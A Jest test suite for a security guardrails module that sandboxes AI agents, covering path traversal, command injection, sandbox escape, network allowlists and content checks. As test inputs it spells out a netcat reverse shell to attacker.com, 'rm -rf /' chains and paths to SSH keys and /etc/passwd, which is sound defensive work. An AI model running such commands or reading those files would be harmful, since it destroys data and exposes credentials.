/**
 * Guardrails Module Unit Tests
 * 
 * Comprehensive tests for security guardrails including:
 * - Sandbox escape prevention
 * - Path traversal protection
 * - Command injection detection
 * - Network allowlist enforcement
 * - Resource limit validation
 * - Content validation
 * - Error handling
 * 
 * @module tests/safety/guardrails
 */

import {
  Guardrails,
  GuardrailResult,
  GuardrailType,
  ViolationSeverity,
  SecurityViolation,
  GuardrailsConfig,
  PathValidationOptions,
  CommandValidationOptions,
  NetworkAllowlistConfig,
  ResourceLimits,
  createGuardrails,
  getGuardrails,
  resetGuardrails,
  DEFAULT_GUARDRAILS_CONFIG,
} from '../../src/safety/guardrails';

// Mock console.error for violation logging
const mockConsoleError = jest.spyOn(console, 'error').mockImplementation(() => {});

describe('Guardrails Module', () => {
  let guardrails: Guardrails;

  beforeEach(() => {
    jest.clearAllMocks();
    resetGuardrails();
    guardrails = createGuardrails();
  });

  afterEach(() => {
    guardrails.clearViolations();
  });

  afterAll(() => {
    mockConsoleError.mockRestore();
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // BASIC INITIALIZATION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Initialization', () => {
    it('should create guardrails with default config', () => {
      const g = createGuardrails();
      const config = g.getConfig();
      
      expect(config.enabled).toBe(true);
      expect(config.logViolations).toBe(true);
      expect(config.autoBlock).toBe(true);
      expect(config.maxViolationsBeforeBlock).toBe(5);
    });

    it('should create guardrails with custom config', () => {
      const customConfig: Partial<GuardrailsConfig> = {
        enabled: false,
        logViolations: false,
        autoBlock: false,
        maxViolationsBeforeBlock: 10,
      };
      
      const g = createGuardrails(customConfig);
      const config = g.getConfig();
      
      expect(config.enabled).toBe(false);
      expect(config.logViolations).toBe(false);
      expect(config.autoBlock).toBe(false);
      expect(config.maxViolationsBeforeBlock).toBe(10);
    });

    it('should return singleton instance', () => {
      const instance1 = getGuardrails();
      const instance2 = getGuardrails();
      
      expect(instance1).toBe(instance2);
    });

    it('should reset singleton instance', () => {
      const instance1 = getGuardrails();
      resetGuardrails();
      const instance2 = getGuardrails();
      
      expect(instance1).not.toBe(instance2);
    });

    it('should update configuration', () => {
      guardrails.updateConfig({ enabled: false });
      
      expect(guardrails.getConfig().enabled).toBe(false);
    });

    it('should emit config_updated event', (done) => {
      guardrails.on('config_updated', (config) => {
        expect(config.enabled).toBe(false);
        done();
      });
      
      guardrails.updateConfig({ enabled: false });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // PATH TRAVERSAL PROTECTION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Path Traversal Protection', () => {
    const agentId = 'test-agent-1';
    const teamId = 'test-team';

    describe('Basic Path Validation', () => {
      it('should allow valid relative paths', () => {
        const result = guardrails.validatePath('workspace/file.txt', agentId, teamId);
        
        expect(result.allowed).toBe(true);
        expect(result.type).toBe('path_traversal');
        expect(result.severity).toBe('info');
      });

      it('should allow paths in allowed directories', () => {
        const result = guardrails.validatePath('/tmp/godel/file.txt', agentId, teamId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block paths with ../ traversal', () => {
        const result = guardrails.validatePath('../../../etc/passwd', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.type).toBe('path_traversal');
        expect(result.severity).toBe('critical');
        expect(result.message).toContain('Path traversal');
      });

      it('should block paths with ..\\ traversal (Windows)', () => {
        const result = guardrails.validatePath('..\\..\\windows\\system32', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.severity).toBe('critical');
      });

      it('should block double traversal attempts', () => {
        const result = guardrails.validatePath('....//....//etc/passwd', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.severity).toBe('critical');
      });

      it('should block paths starting with ..', () => {
        const result = guardrails.validatePath('../secret.txt', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Blocked Paths', () => {
      it('should block /etc directory access', () => {
        const result = guardrails.validatePath('/etc/passwd', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('/etc');
      });

      it('should block /usr/bin access', () => {
        const result = guardrails.validatePath('/usr/bin/ls', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block /bin access', () => {
        const result = guardrails.validatePath('/bin/bash', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block /proc access', () => {
        const result = guardrails.validatePath('/proc/self/environ', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block /sys access', () => {
        const result = guardrails.validatePath('/sys/kernel/debug', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block /root access', () => {
        const result = guardrails.validatePath('/root/.ssh/id_rsa', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block home directory access', () => {
        const result = guardrails.validatePath('/home/user/documents', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Null Byte Injection', () => {
      it('should block null byte in path', () => {
        const result = guardrails.validatePath('file.txt\0.jpg', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Null byte');
        expect(result.severity).toBe('critical');
      });

      it('should block null byte at end of path', () => {
        const result = guardrails.validatePath('file.txt\0', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Environment Variable Resolution', () => {
      it('should resolve $HOME in path', () => {
        process.env.HOME = '/home/testuser';
        const result = guardrails.validatePath('$HOME/.bashrc', agentId, teamId);
        
        // Should be blocked as /home is blocked
        expect(result.allowed).toBe(false);
      });

      it('should resolve ${HOME} in path', () => {
        process.env.HOME = '/home/testuser';
        const result = guardrails.validatePath('${HOME}/.bashrc', agentId, teamId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Absolute Path Restrictions', () => {
      it('should validate absolute paths against allowed list', () => {
        const result = guardrails.validatePath('/tmp/godel/workspace/file.txt', agentId, teamId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block absolute paths outside allowed directories', () => {
        const result = guardrails.validatePath('/opt/application/config', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('not in allowed');
      });
    });

    describe('Custom Path Configuration', () => {
      it('should use custom allowed paths', () => {
        const customGuardrails = createGuardrails({
          pathValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.pathValidation,
            allowedPaths: ['/custom/workspace'],
            allowAbsolute: true,
          },
        });

        const result = customGuardrails.validatePath('/custom/workspace/file.txt', agentId, teamId);
        
        expect(result.allowed).toBe(true);
      });

      it('should use custom blocked paths', () => {
        const customGuardrails = createGuardrails({
          pathValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.pathValidation,
            blockedPaths: ['/secret', '/private'],
          },
        });

        const result = customGuardrails.validatePath('/secret/data.txt', agentId, teamId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('/secret');
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // COMMAND INJECTION DETECTION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Command Injection Detection', () => {
    const agentId = 'test-agent-2';

    describe('Allowed Commands', () => {
      it('should allow ls command', () => {
        const result = guardrails.validateCommand('ls -la', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow cat command', () => {
        const result = guardrails.validateCommand('cat file.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow grep command', () => {
        const result = guardrails.validateCommand('grep pattern file.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow mkdir command', () => {
        const result = guardrails.validateCommand('mkdir newdir', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });

    describe('Blocked Commands', () => {
      it('should block sudo command', () => {
        const result = guardrails.validateCommand('sudo rm -rf /', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.type).toBe('command_injection');
        expect(result.severity).toBe('critical');
        expect(result.message).toContain('sudo');
      });

      it('should block bash command', () => {
        const result = guardrails.validateCommand('bash -c "malicious"', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block sh command', () => {
        const result = guardrails.validateCommand('sh script.sh', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block eval command', () => {
        const result = guardrails.validateCommand('eval "dangerous"', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block exec command', () => {
        const result = guardrails.validateCommand('exec /bin/sh', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block python command', () => {
        const result = guardrails.validateCommand('python script.py', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block node command', () => {
        const result = guardrails.validateCommand('node script.js', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block netcat command', () => {
        const result = guardrails.validateCommand('nc -e /bin/sh attacker.com 4444', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block ssh command', () => {
        const result = guardrails.validateCommand('ssh user@host', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block kill command', () => {
        const result = guardrails.validateCommand('kill -9 1234', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Command Substitution Patterns', () => {
      it('should block $() command substitution', () => {
        const result = guardrails.validateCommand('echo $(whoami)', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('pattern');
      });

      it('should block backtick command substitution', () => {
        const result = guardrails.validateCommand('echo `whoami`', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block semicolon command chaining', () => {
        const result = guardrails.validateCommand('ls; rm -rf /', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block && operator', () => {
        const result = guardrails.validateCommand('ls && rm -rf /', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block || operator', () => {
        const result = guardrails.validateCommand('false || rm -rf /', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Background Execution', () => {
      it('should block background execution', () => {
        // Use echo (which is in allowed commands) with background execution
        const result = guardrails.validateCommand('echo test &', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Background');
      });
    });

    describe('Command Length', () => {
      it('should block commands exceeding max length', () => {
        const longCommand = 'a'.repeat(5000);
        const result = guardrails.validateCommand(longCommand, agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('length');
      });
    });

    describe('Custom Command Configuration', () => {
      it('should allow custom allowed commands', () => {
        const customGuardrails = createGuardrails({
          commandValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.commandValidation,
            allowedCommands: ['custom-cmd'],
          },
        });

        const result = customGuardrails.validateCommand('custom-cmd arg', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block commands not in allowed list', () => {
        const customGuardrails = createGuardrails({
          commandValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.commandValidation,
            allowedCommands: ['custom-cmd'],
          },
        });

        const result = customGuardrails.validateCommand('ls -la', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should use custom blocked commands', () => {
        const customGuardrails = createGuardrails({
          commandValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.commandValidation,
            blockedCommands: ['dangerous-cmd'],
          },
        });

        const result = customGuardrails.validateCommand('dangerous-cmd', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SANDBOX ESCAPE DETECTION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Sandbox Escape Detection', () => {
    const agentId = 'test-agent-3';

    describe('File System Escape', () => {
      it('should detect double path traversal', () => {
        const result = guardrails.detectSandboxEscape('../../..', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.type).toBe('sandbox_escape');
        expect(result.severity).toBe('fatal');
      });

      it('should detect /proc/self/ access', () => {
        const result = guardrails.detectSandboxEscape('/proc/self/fd/0', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('File system');
      });

      it('should detect /sys/kernel/ access', () => {
        const result = guardrails.detectSandboxEscape('/sys/kernel/debug', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect /dev/mem access', () => {
        const result = guardrails.detectSandboxEscape('/dev/mem', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect /dev/kmem access', () => {
        const result = guardrails.detectSandboxEscape('/dev/kmem', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Process Escape', () => {
      it('should detect fork() system call', () => {
        const result = guardrails.detectSandboxEscape('fork()', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Process');
      });

      it('should detect clone() system call', () => {
        const result = guardrails.detectSandboxEscape('clone()', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect exec() system call', () => {
        const result = guardrails.detectSandboxEscape('exec("/bin/sh")', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect execve() system call', () => {
        const result = guardrails.detectSandboxEscape('execve("/bin/sh")', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect system() call', () => {
        const result = guardrails.detectSandboxEscape('system("ls")', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect popen() call', () => {
        const result = guardrails.detectSandboxEscape('popen("cmd", "r")', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Network Escape', () => {
      it('should detect socket() creation', () => {
        const result = guardrails.detectSandboxEscape('socket(AF_INET)', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Network');
      });

      it('should detect bind() call', () => {
        const result = guardrails.detectSandboxEscape('bind(sock, addr)', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect listen() call', () => {
        const result = guardrails.detectSandboxEscape('listen(sock, 5)', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect raw socket', () => {
        const result = guardrails.detectSandboxEscape('SOCK_RAW', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Memory Escape', () => {
      it('should detect mmap() call', () => {
        const result = guardrails.detectSandboxEscape('mmap(NULL, size)', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Memory');
      });

      it('should detect mprotect() call', () => {
        const result = guardrails.detectSandboxEscape('mprotect(addr, len, prot)', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect /proc/self/mem access', () => {
        const result = guardrails.detectSandboxEscape('/proc/self/mem', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Privilege Escalation', () => {
      it('should detect setuid() call', () => {
        const result = guardrails.detectSandboxEscape('setuid(0)', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Privilege');
      });

      it('should detect setgid() call', () => {
        const result = guardrails.detectSandboxEscape('setgid(0)', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect setresuid() call', () => {
        const result = guardrails.detectSandboxEscape('setresuid(0, 0, 0)', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should detect capset() call', () => {
        const result = guardrails.detectSandboxEscape('capset(hdrp)', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Safe Input', () => {
      it('should allow safe file paths', () => {
        const result = guardrails.detectSandboxEscape('/workspace/file.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow safe commands', () => {
        const result = guardrails.detectSandboxEscape('ls -la', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // NETWORK ALLOWLIST ENFORCEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Network Allowlist Enforcement', () => {
    const agentId = 'test-agent-4';

    describe('Protocol Validation', () => {
      it('should allow http protocol', () => {
        const permissiveGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });
        const result = permissiveGuardrails.validateNetworkRequest('http://example.com', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow https protocol', () => {
        const permissiveGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });
        const result = permissiveGuardrails.validateNetworkRequest('https://example.com', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block ftp protocol', () => {
        const result = guardrails.validateNetworkRequest('ftp://example.com', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Protocol not allowed');
      });

      it('should block file protocol', () => {
        const result = guardrails.validateNetworkRequest('file:///etc/passwd', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Blocked Hosts', () => {
      it('should block localhost', () => {
        const result = guardrails.validateNetworkRequest('http://localhost:8080', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('localhost');
      });

      it('should block 127.0.0.1', () => {
        const result = guardrails.validateNetworkRequest('http://127.0.0.1:3000', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block 0.0.0.0', () => {
        const result = guardrails.validateNetworkRequest('http://0.0.0.0:8080', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block ::1', () => {
        const result = guardrails.validateNetworkRequest('http://[::1]:8080', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Blocked Domains', () => {
      it('should block internal.company.com', () => {
        const result = guardrails.validateNetworkRequest('http://internal.company.com', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should block localhost.localdomain', () => {
        const result = guardrails.validateNetworkRequest('http://localhost.localdomain', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Port Validation', () => {
      it('should allow port 80', () => {
        const permissiveGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });
        const result = permissiveGuardrails.validateNetworkRequest('http://example.com:80', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow port 443', () => {
        const permissiveGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });
        const result = permissiveGuardrails.validateNetworkRequest('https://example.com:443', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block port 22 (SSH)', () => {
        const result = guardrails.validateNetworkRequest('http://example.com:22', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Port not allowed');
      });

      it('should block port 3306 (MySQL)', () => {
        const result = guardrails.validateNetworkRequest('http://example.com:3306', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Explicit Allow Requirement', () => {
      it('should block non-explicitly allowed hosts by default', () => {
        const result = guardrails.validateNetworkRequest('http://unknown.com', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('not explicitly allowed');
      });

      it('should allow explicitly configured hosts', () => {
        const customGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            allowedHosts: ['api.example.com'],
          },
        });

        const result = customGuardrails.validateNetworkRequest('http://api.example.com', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow wildcard subdomain', () => {
        const customGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            allowedDomains: ['*.example.com'],
          },
        });

        const result = customGuardrails.validateNetworkRequest('http://sub.example.com', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should disable explicit allow requirement when configured', () => {
        const customGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });

        const result = customGuardrails.validateNetworkRequest('http://any-host.com', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });

    describe('Invalid URLs', () => {
      it('should reject invalid URL format', () => {
        const result = guardrails.validateNetworkRequest('not-a-valid-url', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Invalid URL');
      });

      it('should reject empty URL', () => {
        const result = guardrails.validateNetworkRequest('', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RESOURCE LIMITS
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Resource Limit Validation', () => {
    const agentId = 'test-agent-5';

    describe('File Size', () => {
      it('should allow file within size limit', () => {
        const result = guardrails.validateFileSize(50 * 1024 * 1024, agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block file exceeding size limit', () => {
        const result = guardrails.validateFileSize(200 * 1024 * 1024, agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Resource limit exceeded');
      });

      it('should use custom max file size', () => {
        const customGuardrails = createGuardrails({
          resourceLimits: {
            ...DEFAULT_GUARDRAILS_CONFIG.resourceLimits,
            maxFileSize: 10 * 1024 * 1024,
          },
        });

        const result = customGuardrails.validateFileSize(15 * 1024 * 1024, agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Generic Resource Limits', () => {
      it('should check execution time limit', () => {
        const result = guardrails.checkResourceLimit('maxExecutionTime', 600000, agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.details?.resourceType).toBe('maxExecutionTime');
      });

      it('should check memory usage limit', () => {
        const result = guardrails.checkResourceLimit('maxMemoryUsage', 1024 * 1024 * 1024, agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.details?.resourceType).toBe('maxMemoryUsage');
      });

      it('should allow resource within limit', () => {
        const result = guardrails.checkResourceLimit('maxExecutionTime', 100000, agentId);
        
        expect(result.allowed).toBe(true);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // CONTENT VALIDATION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Content Validation', () => {
    const agentId = 'test-agent-6';

    describe('Content Length', () => {
      it('should allow content within length limit', () => {
        const result = guardrails.validateContent('short content', 'text/plain', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block content exceeding length limit', () => {
        const longContent = 'a'.repeat(11 * 1024 * 1024);
        const result = guardrails.validateContent(longContent, 'text/plain', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('maximum length');
      });
    });

    describe('MIME Type Validation', () => {
      it('should allow plain text', () => {
        const result = guardrails.validateContent('content', 'text/plain', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow markdown', () => {
        const result = guardrails.validateContent('# Heading', 'text/markdown', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should allow JSON', () => {
        const result = guardrails.validateContent('{}', 'application/json', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should block executable MIME type', () => {
        const result = guardrails.validateContent('binary', 'application/x-executable', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.severity).toBe('critical');
      });

      it('should block shell script MIME type', () => {
        const result = guardrails.validateContent('#!/bin/sh', 'application/x-sh', agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('HTML Content Security', () => {
      it('should block script tags in HTML', () => {
        const html = '<html><script>alert("xss")</script></html>';
        const result = guardrails.validateContent(html, 'text/html', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Scripts');
      });

      it('should block iframes in HTML', () => {
        const html = '<html><iframe src="http://evil.com"></iframe></html>';
        const result = guardrails.validateContent(html, 'text/html', agentId);
        
        expect(result.allowed).toBe(false);
        expect(result.message).toContain('Iframes');
      });

      it('should allow safe HTML when scripts enabled', () => {
        const customGuardrails = createGuardrails({
          contentValidation: {
            ...DEFAULT_GUARDRAILS_CONFIG.contentValidation,
            allowScripts: true,
          },
        });

        const html = '<html><script>alert("ok")</script></html>';
        const result = customGuardrails.validateContent(html, 'text/html', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // VIOLATION MANAGEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Violation Management', () => {
    const agentId = 'test-agent-7';

    describe('Violation Tracking', () => {
      it('should track violations', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        
        const violations = guardrails.getViolations(agentId);
        
        expect(violations.length).toBeGreaterThan(0);
        expect(violations[0].agentId).toBe(agentId);
        expect(violations[0].type).toBe('path_traversal');
      });

      it('should get all violations when no agentId specified', () => {
        guardrails.validatePath('../../../etc/passwd', 'agent-1');
        guardrails.validatePath('../../../etc/passwd', 'agent-2');
        
        const violations = guardrails.getViolations();
        
        expect(violations.length).toBe(2);
      });

      it('should get violation count for agent', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        guardrails.validatePath('/etc/passwd', agentId);
        
        const count = guardrails.getViolationCount(agentId);
        
        expect(count).toBe(2);
      });

      it('should return 0 for agent with no violations', () => {
        const count = guardrails.getViolationCount('clean-agent');
        
        expect(count).toBe(0);
      });
    });

    describe('Auto-blocking', () => {
      it('should auto-block agent after max violations', () => {
        // Create guardrails with low threshold
        const strictGuardrails = createGuardrails({
          maxViolationsBeforeBlock: 3,
        });

        // Generate violations
        strictGuardrails.validatePath('../../../etc/passwd', agentId);
        strictGuardrails.validatePath('/etc/passwd', agentId);
        strictGuardrails.validatePath('/root/.ssh', agentId);

        expect(strictGuardrails.isBlocked(agentId)).toBe(true);
      });

      it('should emit agent_blocked event', (done) => {
        const strictGuardrails = createGuardrails({
          maxViolationsBeforeBlock: 1,
        });

        strictGuardrails.on('agent_blocked', ({ agentId: blockedAgent }) => {
          expect(blockedAgent).toBe(agentId);
          done();
        });

        strictGuardrails.validatePath('../../../etc/passwd', agentId);
      });

      it('should not block when autoBlock is disabled', () => {
        const lenientGuardrails = createGuardrails({
          autoBlock: false,
          maxViolationsBeforeBlock: 1,
        });

        lenientGuardrails.validatePath('../../../etc/passwd', agentId);

        expect(lenientGuardrails.isBlocked(agentId)).toBe(false);
      });
    });

    describe('Manual Blocking', () => {
      it('should manually block agent', () => {
        guardrails.blockAgent(agentId, 'manual block');
        
        expect(guardrails.isBlocked(agentId)).toBe(true);
      });

      it('should emit agent_blocked event on manual block', (done) => {
        guardrails.on('agent_blocked', ({ agentId: blockedAgent }) => {
          expect(blockedAgent).toBe(agentId);
          done();
        });

        guardrails.blockAgent(agentId, 'test');
      });

      it('should unblock agent', () => {
        guardrails.blockAgent(agentId, 'test');
        guardrails.unblockAgent(agentId);
        
        expect(guardrails.isBlocked(agentId)).toBe(false);
      });

      it('should reset violation count on unblock', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        guardrails.blockAgent(agentId, 'test');
        guardrails.unblockAgent(agentId);
        
        expect(guardrails.getViolationCount(agentId)).toBe(0);
      });

      it('should emit agent_unblocked event', (done) => {
        guardrails.blockAgent(agentId, 'test');
        
        guardrails.on('agent_unblocked', ({ agentId: unblockedAgent }) => {
          expect(unblockedAgent).toBe(agentId);
          done();
        });

        guardrails.unblockAgent(agentId);
      });
    });

    describe('Violation Resolution', () => {
      it('should resolve violation', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        const violations = guardrails.getViolations(agentId);
        const violationId = violations[0].id;

        const resolved = guardrails.resolveViolation(violationId, 'Investigated and cleared');

        expect(resolved).toBe(true);
        expect(violations[0].resolved).toBe(true);
        expect(violations[0].resolution).toBe('Investigated and cleared');
      });

      it('should emit violation_resolved event', (done) => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        const violations = guardrails.getViolations(agentId);
        const violationId = violations[0].id;

        guardrails.on('violation_resolved', ({ violationId: resolvedId }) => {
          expect(resolvedId).toBe(violationId);
          done();
        });

        guardrails.resolveViolation(violationId, 'Cleared');
      });

      it('should return false for non-existent violation', () => {
        const resolved = guardrails.resolveViolation('non-existent-id', 'test');

        expect(resolved).toBe(false);
      });
    });

    describe('Clear Violations', () => {
      it('should clear all violations', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);
        guardrails.clearViolations();
        
        const violations = guardrails.getViolations();
        expect(violations.length).toBe(0);
      });

      it('should unblock all agents on clear', () => {
        guardrails.blockAgent(agentId, 'test');
        guardrails.clearViolations();
        
        expect(guardrails.isBlocked(agentId)).toBe(false);
      });

      it('should emit violations_cleared event', (done) => {
        guardrails.on('violations_cleared', () => {
          done();
        });

        guardrails.clearViolations();
      });
    });

    describe('Violation Logging', () => {
      it('should log violations when enabled', () => {
        guardrails.validatePath('../../../etc/passwd', agentId);

        expect(mockConsoleError).toHaveBeenCalled();
        expect(mockConsoleError.mock.calls[0][0]).toContain('GUARDRAIL VIOLATION');
      });

      it('should not log violations when disabled', () => {
        const quietGuardrails = createGuardrails({
          logViolations: false,
        });

        quietGuardrails.validatePath('../../../etc/passwd', agentId);

        // Should not have additional calls beyond previous tests
        const callCount = mockConsoleError.mock.calls.length;
        quietGuardrails.validatePath('/etc/passwd', agentId);
        expect(mockConsoleError.mock.calls.length).toBe(callCount);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // BATCH VALIDATION
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Batch Validation', () => {
    const agentId = 'test-agent-8';

    describe('validateAll', () => {
      it('should validate multiple aspects', () => {
        const permissiveGuardrails = createGuardrails({
          networkAllowlist: {
            ...DEFAULT_GUARDRAILS_CONFIG.networkAllowlist,
            requireExplicitAllow: false,
          },
        });
        const results = permissiveGuardrails.validateAll({
          path: 'workspace/file.txt',
          command: 'ls -la',
          networkUrl: 'http://example.com',
        }, agentId);

        expect(results.length).toBe(3);
        expect(results.every(r => r.allowed)).toBe(true);
      });

      it('should return partial results', () => {
        const results = guardrails.validateAll({
          path: '../../../etc/passwd',
          command: 'ls -la',
        }, agentId);

        expect(results.length).toBe(2);
        expect(results[0].allowed).toBe(false);
        expect(results[1].allowed).toBe(true);
      });

      it('should include all validation types when provided', () => {
        const results = guardrails.validateAll({
          path: 'workspace/file.txt',
          command: 'ls -la',
          networkUrl: 'http://example.com',
          content: { data: 'test', mimeType: 'text/plain' },
          sandboxCheck: 'safe string',
        }, agentId);

        expect(results.length).toBe(5);
      });
    });

